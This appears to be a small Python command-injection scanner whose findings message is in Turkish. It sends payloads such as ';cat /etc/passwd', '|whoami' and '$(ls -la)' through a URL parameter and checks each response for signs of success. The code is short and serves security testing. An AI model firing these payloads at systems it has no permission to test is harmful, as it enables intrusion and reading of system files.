import requests

CMDI_PAYLOADS = [
    ";cat /etc/passwd", "|whoami", "&dir", "|ls", "&whoami",
    "`id`", "$(ls -la)", "|| net user"
]

def test_cmd_injection(url):
    results = []
    for payload in CMDI_PAYLOADS:
        test_url = f"{url}?cmd={payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if any(ind in r.text.lower() for ind in ["root:x", "bin/bash", "windows", "administrator"]):
                results.append(f"⚠️ Komut Enjeksiyonu Açığı: {test_url}")
        except requests.RequestException:
            continue
    return results
